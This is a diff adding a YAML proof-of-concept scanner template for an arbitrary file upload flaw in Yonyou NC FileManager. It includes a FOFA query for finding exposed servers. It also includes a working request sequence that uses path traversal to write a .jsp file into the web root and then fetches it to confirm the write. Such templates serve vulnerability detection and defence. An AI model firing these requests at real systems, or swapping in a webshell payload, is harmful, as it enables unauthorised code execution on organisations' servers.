@@ -1,0 +1,24 @@
+id: poc-yaml-yongyou-nc-filemanager-anyfile-upload
+info:
+  name: 用友 NC FileManager 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 用友NC
+  fofa: app="用友-UFIDA-NC"
+variables:
+  t1: random_str(4)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /portal/pt/file/upload?pageId=login&filemanager=nc.uap.lfw.file.FileManager&iscover=true&billitem=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwebapps%5Cnc_web%5C
+  headers:
+    Content-Type: multipart/form-data;boundary=d0b7a0d40eed0e32904c8017b09eb305
+  data: "--d0b7a0d40eed0e32904c8017b09eb305\nContent-Disposition: form-data; name=\"\
+    file\"; filename=\"{{.t1}}.jsp\" \nContent-Type: text/plain\n\n{{.t2}}\n--d0b7a0d40eed0e32904c8017b09eb305--"
+  expression: status_code == 200 && contains(body,".jsp") && contains(body,"nc_web")
+    && !contains(body,"<")
+- method: GET
+  path: /{{.t1}}.jsp
+  expression: status_code == 200 && body == t2
+transport: http
